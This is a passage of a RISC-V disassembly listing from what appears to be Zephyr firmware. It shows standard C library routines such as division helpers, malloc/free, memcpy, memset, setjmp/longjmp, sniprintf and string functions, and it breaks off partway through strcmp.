80040558:	02e78f33          	mul	t5,a5,a4
8004055c:	00070e13          	mv	t3,a4
80040560:	01e87e63          	bgeu	a6,t5,8004057c <__udivdi3+0x364>
80040564:	00d80833          	add	a6,a6,a3
80040568:	fff70e13          	addi	t3,a4,-1 # ffffff <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0xf85edf>
8004056c:	00d86863          	bltu	a6,a3,8004057c <__udivdi3+0x364>
80040570:	01e87663          	bgeu	a6,t5,8004057c <__udivdi3+0x364>
80040574:	ffe70e13          	addi	t3,a4,-2
80040578:	00d80833          	add	a6,a6,a3
8004057c:	41e80833          	sub	a6,a6,t5
80040580:	03d878b3          	remu	a7,a6,t4
80040584:	03d85833          	divu	a6,a6,t4
80040588:	01089893          	slli	a7,a7,0x10
8004058c:	03078eb3          	mul	t4,a5,a6
80040590:	01031793          	slli	a5,t1,0x10
80040594:	0107d793          	srli	a5,a5,0x10
80040598:	00f8e7b3          	or	a5,a7,a5
8004059c:	00080713          	mv	a4,a6
800405a0:	01d7fe63          	bgeu	a5,t4,800405bc <__udivdi3+0x3a4>
800405a4:	00d787b3          	add	a5,a5,a3
800405a8:	fff80713          	addi	a4,a6,-1
800405ac:	00d7e863          	bltu	a5,a3,800405bc <__udivdi3+0x3a4>
800405b0:	01d7f663          	bgeu	a5,t4,800405bc <__udivdi3+0x3a4>
800405b4:	ffe80713          	addi	a4,a6,-2
800405b8:	00d787b3          	add	a5,a5,a3
800405bc:	010e1e13          	slli	t3,t3,0x10
800405c0:	41d787b3          	sub	a5,a5,t4
800405c4:	00010eb7          	lui	t4,0x10
800405c8:	00ee6733          	or	a4,t3,a4
800405cc:	fffe8813          	addi	a6,t4,-1 # ffff <CONFIG_ISR_STACK_SIZE+0xefff>
800405d0:	01077333          	and	t1,a4,a6
800405d4:	01075893          	srli	a7,a4,0x10
800405d8:	01067833          	and	a6,a2,a6
800405dc:	01065613          	srli	a2,a2,0x10
800405e0:	03030e33          	mul	t3,t1,a6
800405e4:	03088833          	mul	a6,a7,a6
800405e8:	010e5693          	srli	a3,t3,0x10
800405ec:	02c30333          	mul	t1,t1,a2
800405f0:	01030333          	add	t1,t1,a6
800405f4:	006686b3          	add	a3,a3,t1
800405f8:	02c888b3          	mul	a7,a7,a2
800405fc:	0106f463          	bgeu	a3,a6,80040604 <__udivdi3+0x3ec>
80040600:	01d888b3          	add	a7,a7,t4
80040604:	0106d613          	srli	a2,a3,0x10
80040608:	011608b3          	add	a7,a2,a7
8004060c:	0317e663          	bltu	a5,a7,80040638 <__udivdi3+0x420>
80040610:	cf179ae3          	bne	a5,a7,80040304 <__udivdi3+0xec>
80040614:	000107b7          	lui	a5,0x10
80040618:	fff78793          	addi	a5,a5,-1 # ffff <CONFIG_ISR_STACK_SIZE+0xefff>
8004061c:	00f6f6b3          	and	a3,a3,a5
80040620:	01069693          	slli	a3,a3,0x10
80040624:	00fe7e33          	and	t3,t3,a5
80040628:	00b51533          	sll	a0,a0,a1
8004062c:	01c686b3          	add	a3,a3,t3
80040630:	00000593          	li	a1,0
80040634:	dad57ce3          	bgeu	a0,a3,800403ec <__udivdi3+0x1d4>
80040638:	fff70713          	addi	a4,a4,-1
8004063c:	cc9ff06f          	j	80040304 <__udivdi3+0xec>
80040640:	00000593          	li	a1,0
80040644:	00000713          	li	a4,0
80040648:	da5ff06f          	j	800403ec <__udivdi3+0x1d4>

8004064c <exit>:
8004064c:	ff010113          	addi	sp,sp,-16
80040650:	000007b7          	lui	a5,0x0
80040654:	00812423          	sw	s0,8(sp)
80040658:	00112623          	sw	ra,12(sp)
8004065c:	00078793          	mv	a5,a5
80040660:	00050413          	mv	s0,a0
80040664:	00078863          	beqz	a5,80040674 <exit+0x28>
80040668:	00000593          	li	a1,0
8004066c:	00000097          	auipc	ra,0x0
80040670:	000000e7          	jalr	zero # 0 <CONFIG_BOOT_DELAY>
80040674:	800457b7          	lui	a5,0x80045
80040678:	1d07a503          	lw	a0,464(a5) # 800451d0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800451d1>
8004067c:	03c52783          	lw	a5,60(a0)
80040680:	00078463          	beqz	a5,80040688 <exit+0x3c>
80040684:	000780e7          	jalr	a5
80040688:	00040513          	mv	a0,s0
8004068c:	4c7030ef          	jal	ra,80044352 <_exit>

80040690 <malloc>:
80040690:	800477b7          	lui	a5,0x80047
80040694:	00050593          	mv	a1,a0
80040698:	d307a503          	lw	a0,-720(a5) # 80046d30 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d31>
8004069c:	2d40006f          	j	80040970 <_malloc_r>

800406a0 <free>:
800406a0:	800477b7          	lui	a5,0x80047
800406a4:	00050593          	mv	a1,a0
800406a8:	d307a503          	lw	a0,-720(a5) # 80046d30 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d31>
800406ac:	1b80006f          	j	80040864 <_free_r>

800406b0 <memcpy>:
800406b0:	00a5c7b3          	xor	a5,a1,a0
800406b4:	0037f793          	andi	a5,a5,3
800406b8:	00c50733          	add	a4,a0,a2
800406bc:	00079663          	bnez	a5,800406c8 <memcpy+0x18>
800406c0:	00300793          	li	a5,3
800406c4:	02c7e263          	bltu	a5,a2,800406e8 <memcpy+0x38>
800406c8:	00050793          	mv	a5,a0
800406cc:	0ae57c63          	bgeu	a0,a4,80040784 <memcpy+0xd4>
800406d0:	0005c683          	lbu	a3,0(a1)
800406d4:	00178793          	addi	a5,a5,1
800406d8:	00158593          	addi	a1,a1,1
800406dc:	fed78fa3          	sb	a3,-1(a5)
800406e0:	fee7e8e3          	bltu	a5,a4,800406d0 <memcpy+0x20>
800406e4:	00008067          	ret
800406e8:	00357693          	andi	a3,a0,3
800406ec:	00050793          	mv	a5,a0
800406f0:	00068e63          	beqz	a3,8004070c <memcpy+0x5c>
800406f4:	0005c683          	lbu	a3,0(a1)
800406f8:	00178793          	addi	a5,a5,1
800406fc:	00158593          	addi	a1,a1,1
80040700:	fed78fa3          	sb	a3,-1(a5)
80040704:	0037f693          	andi	a3,a5,3
80040708:	fe9ff06f          	j	800406f0 <memcpy+0x40>
8004070c:	ffc77693          	andi	a3,a4,-4
80040710:	fe068613          	addi	a2,a3,-32
80040714:	06c7f463          	bgeu	a5,a2,8004077c <memcpy+0xcc>
80040718:	0005a383          	lw	t2,0(a1)
8004071c:	0045a283          	lw	t0,4(a1)
80040720:	0085af83          	lw	t6,8(a1)
80040724:	00c5af03          	lw	t5,12(a1)
80040728:	0105ae83          	lw	t4,16(a1)
8004072c:	0145ae03          	lw	t3,20(a1)
80040730:	0185a303          	lw	t1,24(a1)
80040734:	01c5a883          	lw	a7,28(a1)
80040738:	02458593          	addi	a1,a1,36
8004073c:	0077a023          	sw	t2,0(a5)
80040740:	ffc5a803          	lw	a6,-4(a1)
80040744:	0057a223          	sw	t0,4(a5)
80040748:	01f7a423          	sw	t6,8(a5)
8004074c:	01e7a623          	sw	t5,12(a5)
80040750:	01d7a823          	sw	t4,16(a5)
80040754:	01c7aa23          	sw	t3,20(a5)
80040758:	0067ac23          	sw	t1,24(a5)
8004075c:	0117ae23          	sw	a7,28(a5)
80040760:	02478793          	addi	a5,a5,36
80040764:	ff07ae23          	sw	a6,-4(a5)
80040768:	fadff06f          	j	80040714 <memcpy+0x64>
8004076c:	0005a603          	lw	a2,0(a1)
80040770:	00478793          	addi	a5,a5,4
80040774:	00458593          	addi	a1,a1,4
80040778:	fec7ae23          	sw	a2,-4(a5)
8004077c:	fed7e8e3          	bltu	a5,a3,8004076c <memcpy+0xbc>
80040780:	f4e7e8e3          	bltu	a5,a4,800406d0 <memcpy+0x20>
80040784:	00008067          	ret

80040788 <memset>:
80040788:	00f00313          	li	t1,15
8004078c:	00050713          	mv	a4,a0
80040790:	02c37e63          	bgeu	t1,a2,800407cc <memset+0x44>
80040794:	00f77793          	andi	a5,a4,15
80040798:	0a079063          	bnez	a5,80040838 <memset+0xb0>
8004079c:	08059263          	bnez	a1,80040820 <memset+0x98>
800407a0:	ff067693          	andi	a3,a2,-16
800407a4:	00f67613          	andi	a2,a2,15
800407a8:	00e686b3          	add	a3,a3,a4
800407ac:	00b72023          	sw	a1,0(a4)
800407b0:	00b72223          	sw	a1,4(a4)
800407b4:	00b72423          	sw	a1,8(a4)
800407b8:	00b72623          	sw	a1,12(a4)
800407bc:	01070713          	addi	a4,a4,16
800407c0:	fed766e3          	bltu	a4,a3,800407ac <memset+0x24>
800407c4:	00061463          	bnez	a2,800407cc <memset+0x44>
800407c8:	00008067          	ret
800407cc:	40c306b3          	sub	a3,t1,a2
800407d0:	00269693          	slli	a3,a3,0x2
800407d4:	00000297          	auipc	t0,0x0
800407d8:	005686b3          	add	a3,a3,t0
800407dc:	00c68067          	jr	12(a3)
800407e0:	00b70723          	sb	a1,14(a4)
800407e4:	00b706a3          	sb	a1,13(a4)
800407e8:	00b70623          	sb	a1,12(a4)
800407ec:	00b705a3          	sb	a1,11(a4)
800407f0:	00b70523          	sb	a1,10(a4)
800407f4:	00b704a3          	sb	a1,9(a4)
800407f8:	00b70423          	sb	a1,8(a4)
800407fc:	00b703a3          	sb	a1,7(a4)
80040800:	00b70323          	sb	a1,6(a4)
80040804:	00b702a3          	sb	a1,5(a4)
80040808:	00b70223          	sb	a1,4(a4)
8004080c:	00b701a3          	sb	a1,3(a4)
80040810:	00b70123          	sb	a1,2(a4)
80040814:	00b700a3          	sb	a1,1(a4)
80040818:	00b70023          	sb	a1,0(a4)
8004081c:	00008067          	ret
80040820:	0ff5f593          	andi	a1,a1,255
80040824:	00859693          	slli	a3,a1,0x8
80040828:	00d5e5b3          	or	a1,a1,a3
8004082c:	01059693          	slli	a3,a1,0x10
80040830:	00d5e5b3          	or	a1,a1,a3
80040834:	f6dff06f          	j	800407a0 <memset+0x18>
80040838:	00279693          	slli	a3,a5,0x2
8004083c:	00000297          	auipc	t0,0x0
80040840:	005686b3          	add	a3,a3,t0
80040844:	00008293          	mv	t0,ra
80040848:	fa0680e7          	jalr	-96(a3)
8004084c:	00028093          	mv	ra,t0
80040850:	ff078793          	addi	a5,a5,-16
80040854:	40f70733          	sub	a4,a4,a5
80040858:	00f60633          	add	a2,a2,a5
8004085c:	f6c378e3          	bgeu	t1,a2,800407cc <memset+0x44>
80040860:	f3dff06f          	j	8004079c <memset+0x14>

80040864 <_free_r>:
80040864:	10058463          	beqz	a1,8004096c <_free_r+0x108>
80040868:	ffc5a783          	lw	a5,-4(a1)
8004086c:	ff010113          	addi	sp,sp,-16
80040870:	00812423          	sw	s0,8(sp)
80040874:	00112623          	sw	ra,12(sp)
80040878:	00912223          	sw	s1,4(sp)
8004087c:	ffc58413          	addi	s0,a1,-4
80040880:	0007d463          	bgez	a5,80040888 <_free_r+0x24>
80040884:	00f40433          	add	s0,s0,a5
80040888:	00050493          	mv	s1,a0
8004088c:	1c9000ef          	jal	ra,80041254 <__malloc_lock>
80040890:	80047737          	lui	a4,0x80047
80040894:	d8c72783          	lw	a5,-628(a4) # 80046d8c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d8d>
80040898:	00070613          	mv	a2,a4
8004089c:	02079263          	bnez	a5,800408c0 <_free_r+0x5c>
800408a0:	00042223          	sw	zero,4(s0)
800408a4:	d8872623          	sw	s0,-628(a4)
800408a8:	00812403          	lw	s0,8(sp)
800408ac:	00c12083          	lw	ra,12(sp)
800408b0:	00048513          	mv	a0,s1
800408b4:	00412483          	lw	s1,4(sp)
800408b8:	01010113          	addi	sp,sp,16
800408bc:	19d0006f          	j	80041258 <__malloc_unlock>
800408c0:	02f47863          	bgeu	s0,a5,800408f0 <_free_r+0x8c>
800408c4:	00042683          	lw	a3,0(s0)
800408c8:	00d40733          	add	a4,s0,a3
800408cc:	00e79a63          	bne	a5,a4,800408e0 <_free_r+0x7c>
800408d0:	0007a703          	lw	a4,0(a5)
800408d4:	0047a783          	lw	a5,4(a5)
800408d8:	00d70733          	add	a4,a4,a3
800408dc:	00e42023          	sw	a4,0(s0)
800408e0:	00f42223          	sw	a5,4(s0)
800408e4:	d8862623          	sw	s0,-628(a2)
800408e8:	fc1ff06f          	j	800408a8 <_free_r+0x44>
800408ec:	00070793          	mv	a5,a4
800408f0:	0047a703          	lw	a4,4(a5)
800408f4:	00070463          	beqz	a4,800408fc <_free_r+0x98>
800408f8:	fee47ae3          	bgeu	s0,a4,800408ec <_free_r+0x88>
800408fc:	0007a683          	lw	a3,0(a5)
80040900:	00d78633          	add	a2,a5,a3
80040904:	02861863          	bne	a2,s0,80040934 <_free_r+0xd0>
80040908:	00042603          	lw	a2,0(s0)
8004090c:	00c686b3          	add	a3,a3,a2
80040910:	00d7a023          	sw	a3,0(a5)
80040914:	00d78633          	add	a2,a5,a3
80040918:	f8c718e3          	bne	a4,a2,800408a8 <_free_r+0x44>
8004091c:	00072603          	lw	a2,0(a4)
80040920:	00472703          	lw	a4,4(a4)
80040924:	00d606b3          	add	a3,a2,a3
80040928:	00d7a023          	sw	a3,0(a5)
8004092c:	00e7a223          	sw	a4,4(a5)
80040930:	f79ff06f          	j	800408a8 <_free_r+0x44>
80040934:	00c47863          	bgeu	s0,a2,80040944 <_free_r+0xe0>
80040938:	00c00793          	li	a5,12
8004093c:	00f4a023          	sw	a5,0(s1)
80040940:	f69ff06f          	j	800408a8 <_free_r+0x44>
80040944:	00042603          	lw	a2,0(s0)
80040948:	00c406b3          	add	a3,s0,a2
8004094c:	00d71a63          	bne	a4,a3,80040960 <_free_r+0xfc>
80040950:	00072683          	lw	a3,0(a4)
80040954:	00472703          	lw	a4,4(a4)
80040958:	00c686b3          	add	a3,a3,a2
8004095c:	00d42023          	sw	a3,0(s0)
80040960:	00e42223          	sw	a4,4(s0)
80040964:	0087a223          	sw	s0,4(a5)
80040968:	f41ff06f          	j	800408a8 <_free_r+0x44>
8004096c:	00008067          	ret

80040970 <_malloc_r>:
80040970:	fe010113          	addi	sp,sp,-32
80040974:	00912a23          	sw	s1,20(sp)
80040978:	00358493          	addi	s1,a1,3
8004097c:	ffc4f493          	andi	s1,s1,-4
80040980:	00112e23          	sw	ra,28(sp)
80040984:	00812c23          	sw	s0,24(sp)
80040988:	01212823          	sw	s2,16(sp)
8004098c:	01312623          	sw	s3,12(sp)
80040990:	00848493          	addi	s1,s1,8
80040994:	00c00793          	li	a5,12
80040998:	06f4f663          	bgeu	s1,a5,80040a04 <_malloc_r+0x94>
8004099c:	00c00493          	li	s1,12
800409a0:	06b4e463          	bltu	s1,a1,80040a08 <_malloc_r+0x98>
800409a4:	00050913          	mv	s2,a0
800409a8:	0ad000ef          	jal	ra,80041254 <__malloc_lock>
800409ac:	800477b7          	lui	a5,0x80047
800409b0:	d8c7a703          	lw	a4,-628(a5) # 80046d8c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d8d>
800409b4:	00078693          	mv	a3,a5
800409b8:	00070413          	mv	s0,a4
800409bc:	06041a63          	bnez	s0,80040a30 <_malloc_r+0xc0>
800409c0:	80047437          	lui	s0,0x80047
800409c4:	d8842783          	lw	a5,-632(s0) # 80046d88 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d89>
800409c8:	00079a63          	bnez	a5,800409dc <_malloc_r+0x6c>
800409cc:	00000593          	li	a1,0
800409d0:	00090513          	mv	a0,s2
800409d4:	0ec000ef          	jal	ra,80040ac0 <_sbrk_r>
800409d8:	d8a42423          	sw	a0,-632(s0)
800409dc:	00048593          	mv	a1,s1
800409e0:	00090513          	mv	a0,s2
800409e4:	0dc000ef          	jal	ra,80040ac0 <_sbrk_r>
800409e8:	fff00993          	li	s3,-1
800409ec:	0b351a63          	bne	a0,s3,80040aa0 <_malloc_r+0x130>
800409f0:	00c00793          	li	a5,12
800409f4:	00f92023          	sw	a5,0(s2)
800409f8:	00090513          	mv	a0,s2
800409fc:	05d000ef          	jal	ra,80041258 <__malloc_unlock>
80040a00:	0100006f          	j	80040a10 <_malloc_r+0xa0>
80040a04:	f804dee3          	bgez	s1,800409a0 <_malloc_r+0x30>
80040a08:	00c00793          	li	a5,12
80040a0c:	00f52023          	sw	a5,0(a0)
80040a10:	00000513          	li	a0,0
80040a14:	01c12083          	lw	ra,28(sp)
80040a18:	01812403          	lw	s0,24(sp)
80040a1c:	01412483          	lw	s1,20(sp)
80040a20:	01012903          	lw	s2,16(sp)
80040a24:	00c12983          	lw	s3,12(sp)
80040a28:	02010113          	addi	sp,sp,32
80040a2c:	00008067          	ret
80040a30:	00042783          	lw	a5,0(s0)
80040a34:	409787b3          	sub	a5,a5,s1
80040a38:	0407ce63          	bltz	a5,80040a94 <_malloc_r+0x124>
80040a3c:	00b00613          	li	a2,11
80040a40:	00f67a63          	bgeu	a2,a5,80040a54 <_malloc_r+0xe4>
80040a44:	00f42023          	sw	a5,0(s0)
80040a48:	00f40433          	add	s0,s0,a5
80040a4c:	00942023          	sw	s1,0(s0)
80040a50:	0100006f          	j	80040a60 <_malloc_r+0xf0>
80040a54:	00442783          	lw	a5,4(s0)
80040a58:	02871a63          	bne	a4,s0,80040a8c <_malloc_r+0x11c>
80040a5c:	d8f6a623          	sw	a5,-628(a3)
80040a60:	00090513          	mv	a0,s2
80040a64:	7f4000ef          	jal	ra,80041258 <__malloc_unlock>
80040a68:	00b40513          	addi	a0,s0,11
80040a6c:	00440793          	addi	a5,s0,4
80040a70:	ff857513          	andi	a0,a0,-8
80040a74:	40f50733          	sub	a4,a0,a5
80040a78:	f8070ee3          	beqz	a4,80040a14 <_malloc_r+0xa4>
80040a7c:	00e40433          	add	s0,s0,a4
80040a80:	40a787b3          	sub	a5,a5,a0
80040a84:	00f42023          	sw	a5,0(s0)
80040a88:	f8dff06f          	j	80040a14 <_malloc_r+0xa4>
80040a8c:	00f72223          	sw	a5,4(a4)
80040a90:	fd1ff06f          	j	80040a60 <_malloc_r+0xf0>
80040a94:	00040713          	mv	a4,s0
80040a98:	00442403          	lw	s0,4(s0)
80040a9c:	f21ff06f          	j	800409bc <_malloc_r+0x4c>
80040aa0:	00350413          	addi	s0,a0,3
80040aa4:	ffc47413          	andi	s0,s0,-4
80040aa8:	fa8502e3          	beq	a0,s0,80040a4c <_malloc_r+0xdc>
80040aac:	40a405b3          	sub	a1,s0,a0
80040ab0:	00090513          	mv	a0,s2
80040ab4:	00c000ef          	jal	ra,80040ac0 <_sbrk_r>
80040ab8:	f9351ae3          	bne	a0,s3,80040a4c <_malloc_r+0xdc>
80040abc:	f35ff06f          	j	800409f0 <_malloc_r+0x80>

80040ac0 <_sbrk_r>:
80040ac0:	ff010113          	addi	sp,sp,-16
80040ac4:	00812423          	sw	s0,8(sp)
80040ac8:	00912223          	sw	s1,4(sp)
80040acc:	80047437          	lui	s0,0x80047
80040ad0:	00050493          	mv	s1,a0
80040ad4:	00058513          	mv	a0,a1
80040ad8:	00112623          	sw	ra,12(sp)
80040adc:	26042a23          	sw	zero,628(s0) # 80047274 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047275>
80040ae0:	087030ef          	jal	ra,80044366 <_sbrk>
80040ae4:	fff00793          	li	a5,-1
80040ae8:	00f51863          	bne	a0,a5,80040af8 <_sbrk_r+0x38>
80040aec:	27442783          	lw	a5,628(s0)
80040af0:	00078463          	beqz	a5,80040af8 <_sbrk_r+0x38>
80040af4:	00f4a023          	sw	a5,0(s1)
80040af8:	00c12083          	lw	ra,12(sp)
80040afc:	00812403          	lw	s0,8(sp)
80040b00:	00412483          	lw	s1,4(sp)
80040b04:	01010113          	addi	sp,sp,16
80040b08:	00008067          	ret

80040b0c <setjmp>:
80040b0c:	00152023          	sw	ra,0(a0)
80040b10:	00852223          	sw	s0,4(a0)
80040b14:	00952423          	sw	s1,8(a0)
80040b18:	01252623          	sw	s2,12(a0)
80040b1c:	01352823          	sw	s3,16(a0)
80040b20:	01452a23          	sw	s4,20(a0)
80040b24:	01552c23          	sw	s5,24(a0)
80040b28:	01652e23          	sw	s6,28(a0)
80040b2c:	03752023          	sw	s7,32(a0)
80040b30:	03852223          	sw	s8,36(a0)
80040b34:	03952423          	sw	s9,40(a0)
80040b38:	03a52623          	sw	s10,44(a0)
80040b3c:	03b52823          	sw	s11,48(a0)
80040b40:	02252a23          	sw	sp,52(a0)
80040b44:	00000513          	li	a0,0
80040b48:	00008067          	ret

80040b4c <longjmp>:
80040b4c:	00052083          	lw	ra,0(a0)
80040b50:	00452403          	lw	s0,4(a0)
80040b54:	00852483          	lw	s1,8(a0)
80040b58:	00c52903          	lw	s2,12(a0)
80040b5c:	01052983          	lw	s3,16(a0)
80040b60:	01452a03          	lw	s4,20(a0)
80040b64:	01852a83          	lw	s5,24(a0)
80040b68:	01c52b03          	lw	s6,28(a0)
80040b6c:	02052b83          	lw	s7,32(a0)
80040b70:	02452c03          	lw	s8,36(a0)
80040b74:	02852c83          	lw	s9,40(a0)
80040b78:	02c52d03          	lw	s10,44(a0)
80040b7c:	03052d83          	lw	s11,48(a0)
80040b80:	03452103          	lw	sp,52(a0)
80040b84:	0015b513          	seqz	a0,a1
80040b88:	00b50533          	add	a0,a0,a1
80040b8c:	00008067          	ret

80040b90 <_sniprintf_r>:
80040b90:	f7010113          	addi	sp,sp,-144
80040b94:	06112e23          	sw	ra,124(sp)
80040b98:	06812c23          	sw	s0,120(sp)
80040b9c:	06912a23          	sw	s1,116(sp)
80040ba0:	07212823          	sw	s2,112(sp)
80040ba4:	08e12023          	sw	a4,128(sp)
80040ba8:	08f12223          	sw	a5,132(sp)
80040bac:	09012423          	sw	a6,136(sp)
80040bb0:	09112623          	sw	a7,140(sp)
80040bb4:	02065463          	bgez	a2,80040bdc <_sniprintf_r+0x4c>
80040bb8:	08b00793          	li	a5,139
80040bbc:	00f52023          	sw	a5,0(a0)
80040bc0:	fff00513          	li	a0,-1
80040bc4:	07c12083          	lw	ra,124(sp)
80040bc8:	07812403          	lw	s0,120(sp)
80040bcc:	07412483          	lw	s1,116(sp)
80040bd0:	07012903          	lw	s2,112(sp)
80040bd4:	09010113          	addi	sp,sp,144
80040bd8:	00008067          	ret
80040bdc:	20800793          	li	a5,520
80040be0:	00f11c23          	sh	a5,24(sp)
80040be4:	00b12623          	sw	a1,12(sp)
80040be8:	00b12e23          	sw	a1,28(sp)
80040bec:	00060413          	mv	s0,a2
80040bf0:	00000793          	li	a5,0
80040bf4:	00060463          	beqz	a2,80040bfc <_sniprintf_r+0x6c>
80040bf8:	fff60793          	addi	a5,a2,-1
80040bfc:	fff00913          	li	s2,-1
80040c00:	00068613          	mv	a2,a3
80040c04:	00c10593          	addi	a1,sp,12
80040c08:	08010693          	addi	a3,sp,128
80040c0c:	00050493          	mv	s1,a0
80040c10:	00f12a23          	sw	a5,20(sp)
80040c14:	02f12023          	sw	a5,32(sp)
80040c18:	01211d23          	sh	s2,26(sp)
80040c1c:	00d12423          	sw	a3,8(sp)
80040c20:	16d000ef          	jal	ra,8004158c <_svfiprintf_r>
80040c24:	01255663          	bge	a0,s2,80040c30 <_sniprintf_r+0xa0>
80040c28:	08b00793          	li	a5,139
80040c2c:	00f4a023          	sw	a5,0(s1)
80040c30:	f8040ae3          	beqz	s0,80040bc4 <_sniprintf_r+0x34>
80040c34:	00c12783          	lw	a5,12(sp)
80040c38:	00078023          	sb	zero,0(a5)
80040c3c:	f89ff06f          	j	80040bc4 <_sniprintf_r+0x34>

80040c40 <sniprintf>:
80040c40:	f6010113          	addi	sp,sp,-160
80040c44:	06912a23          	sw	s1,116(sp)
80040c48:	08f12a23          	sw	a5,148(sp)
80040c4c:	06112e23          	sw	ra,124(sp)
80040c50:	800477b7          	lui	a5,0x80047
80040c54:	06812c23          	sw	s0,120(sp)
80040c58:	07212823          	sw	s2,112(sp)
80040c5c:	08d12623          	sw	a3,140(sp)
80040c60:	08e12823          	sw	a4,144(sp)
80040c64:	09012c23          	sw	a6,152(sp)
80040c68:	09112e23          	sw	a7,156(sp)
80040c6c:	d307a483          	lw	s1,-720(a5) # 80046d30 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d31>
80040c70:	0205d463          	bgez	a1,80040c98 <sniprintf+0x58>
80040c74:	08b00793          	li	a5,139
80040c78:	00f4a023          	sw	a5,0(s1)
80040c7c:	fff00513          	li	a0,-1
80040c80:	07c12083          	lw	ra,124(sp)
80040c84:	07812403          	lw	s0,120(sp)
80040c88:	07412483          	lw	s1,116(sp)
80040c8c:	07012903          	lw	s2,112(sp)
80040c90:	0a010113          	addi	sp,sp,160
80040c94:	00008067          	ret
80040c98:	20800793          	li	a5,520
80040c9c:	00f11c23          	sh	a5,24(sp)
80040ca0:	00a12623          	sw	a0,12(sp)
80040ca4:	00a12e23          	sw	a0,28(sp)
80040ca8:	00000793          	li	a5,0
80040cac:	00058463          	beqz	a1,80040cb4 <sniprintf+0x74>
80040cb0:	fff58793          	addi	a5,a1,-1
80040cb4:	fff00913          	li	s2,-1
80040cb8:	00058413          	mv	s0,a1
80040cbc:	08c10693          	addi	a3,sp,140
80040cc0:	00c10593          	addi	a1,sp,12
80040cc4:	00048513          	mv	a0,s1
80040cc8:	00f12a23          	sw	a5,20(sp)
80040ccc:	02f12023          	sw	a5,32(sp)
80040cd0:	01211d23          	sh	s2,26(sp)
80040cd4:	00d12423          	sw	a3,8(sp)
80040cd8:	0b5000ef          	jal	ra,8004158c <_svfiprintf_r>
80040cdc:	01255663          	bge	a0,s2,80040ce8 <sniprintf+0xa8>
80040ce0:	08b00793          	li	a5,139
80040ce4:	00f4a023          	sw	a5,0(s1)
80040ce8:	f8040ce3          	beqz	s0,80040c80 <sniprintf+0x40>
80040cec:	00c12783          	lw	a5,12(sp)
80040cf0:	00078023          	sb	zero,0(a5)
80040cf4:	f8dff06f          	j	80040c80 <sniprintf+0x40>

80040cf8 <strcat>:
80040cf8:	00050793          	mv	a5,a0
80040cfc:	0007c703          	lbu	a4,0(a5)
80040d00:	00178693          	addi	a3,a5,1
80040d04:	00071e63          	bnez	a4,80040d20 <strcat+0x28>
80040d08:	00158593          	addi	a1,a1,1
80040d0c:	fff5c703          	lbu	a4,-1(a1)
80040d10:	00178793          	addi	a5,a5,1
80040d14:	fee78fa3          	sb	a4,-1(a5)
80040d18:	fe0718e3          	bnez	a4,80040d08 <strcat+0x10>
80040d1c:	00008067          	ret
80040d20:	00068793          	mv	a5,a3
80040d24:	fd9ff06f          	j	80040cfc <strcat+0x4>

80040d28 <__strcat_chk>:
80040d28:	00050713          	mv	a4,a0
80040d2c:	00074783          	lbu	a5,0(a4)
80040d30:	02079063          	bnez	a5,80040d50 <__strcat_chk+0x28>
80040d34:	00f58833          	add	a6,a1,a5
80040d38:	00084803          	lbu	a6,0(a6)
80040d3c:	00f706b3          	add	a3,a4,a5
80040d40:	02081663          	bnez	a6,80040d6c <__strcat_chk+0x44>
80040d44:	00c78863          	beq	a5,a2,80040d54 <__strcat_chk+0x2c>
80040d48:	00068023          	sb	zero,0(a3)
80040d4c:	00008067          	ret
80040d50:	00061863          	bnez	a2,80040d60 <__strcat_chk+0x38>
80040d54:	ff010113          	addi	sp,sp,-16
80040d58:	00112623          	sw	ra,12(sp)
80040d5c:	4b4000ef          	jal	ra,80041210 <__chk_fail>
80040d60:	00170713          	addi	a4,a4,1
80040d64:	fff60613          	addi	a2,a2,-1
80040d68:	fc5ff06f          	j	80040d2c <__strcat_chk+0x4>
80040d6c:	fec784e3          	beq	a5,a2,80040d54 <__strcat_chk+0x2c>
80040d70:	01068023          	sb	a6,0(a3)
80040d74:	00178793          	addi	a5,a5,1
80040d78:	fbdff06f          	j	80040d34 <__strcat_chk+0xc>

80040d7c <strcmp>:
80040d7c:	00b56733          	or	a4,a0,a1
80040d80:	fff00393          	li	t2,-1
80040d84:	00377713          	andi	a4,a4,3
80040d88:	10071063          	bnez	a4,80040e88 <strcmp+0x10c>
80040d8c:	7f7f87b7          	lui	a5,0x7f7f8
80040d90:	f7f78793          	addi	a5,a5,-129 # 7f7f7f7f <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0x7f77de5f>
80040d94:	00052603          	lw	a2,0(a0)
80040d98:	0005a683          	lw	a3,0(a1)
80040d9c:	00f672b3          	and	t0,a2,a5
80040da0:	00f66333          	or	t1,a2,a5
80040da4:	00f282b3          	add	t0,t0,a5
80040da8:	0062e2b3          	or	t0,t0,t1
80040dac:	10729263          	bne	t0,t2,80040eb0 <strcmp+0x134>
80040db0:	08d61663          	bne	a2,a3,80040e3c <strcmp+0xc0>
80040db4:	00452603          	lw	a2,4(a0)
80040db8:	0045a683          	lw	a3,4(a1)
80040dbc:	00f672b3          	and	t0,a2,a5
80040dc0:	00f66333          	or	t1,a2,a5
80040dc4:	00f282b3          	add	t0,t0,a5
80040dc8:	0062e2b3          	or	t0,t0,t1
80040dcc:	0c729e63          	bne	t0,t2,80040ea8 <strcmp+0x12c>
80040dd0:	06d61663          	bne	a2,a3,80040e3c <strcmp+0xc0>
80040dd4:	00852603          	lw	a2,8(a0)
80040dd8:	0085a683          	lw	a3,8(a1)
80040ddc:	00f672b3          	and	t0,a2,a5
80040de0:	00f66333          	or	t1,a2,a5
80040de4:	00f282b3          	add	t0,t0,a5
80040de8:	0062e2b3          	or	t0,t0,t1
80040dec:	0c729863          	bne	t0,t2,80040ebc <strcmp+0x140>
80040df0:	04d61663          	bne	a2,a3,80040e3c <strcmp+0xc0>
80040df4:	00c52603          	lw	a2,12(a0)
80040df8:	00c5a683          	lw	a3,12(a1)
80040dfc:	00f672b3          	and	t0,a2,a5
80040e00:	00f66333          	or	t1,a2,a5
80040e04:	00f282b3          	add	t0,t0,a5
80040e08:	0062e2b3          	or	t0,t0,t1
